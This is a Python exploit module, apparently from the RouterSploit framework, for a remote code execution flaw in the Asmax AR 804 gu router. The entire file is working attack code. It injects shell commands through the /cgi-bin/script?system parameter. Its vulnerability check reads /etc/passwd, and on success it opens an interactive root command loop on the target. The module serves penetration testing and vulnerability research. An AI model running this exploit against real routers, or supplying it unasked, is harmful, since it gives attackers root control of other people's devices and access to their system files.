from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Asmax AR 804 RCE",
        "description": "Module exploits Asmax AR 804 Remote Code Execution vulnerability which "
                       "allows executing command on operating system level with root privileges.",
        "authors": (
            "Michal Sajdak <michal.sajdak[at]securitum.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.securitum.pl/dh/asmax-ar-804-gu-compromise",
            "https://www.exploit-db.com/exploits/8846/",
        ),
        "devices": (
            "Asmax AR 804 gu",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        print_status("Checking if target is vulnerable")

        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        path = "/cgi-bin/script?system%20{}".format(cmd)

        response = self.http_request(
            method="GET",
            path=path,
        )
        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        cmd = "cat /etc/passwd"
        path = "/cgi-bin/script?system%20{}".format(cmd)

        response = self.http_request(
            method="GET",
            path=path,
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
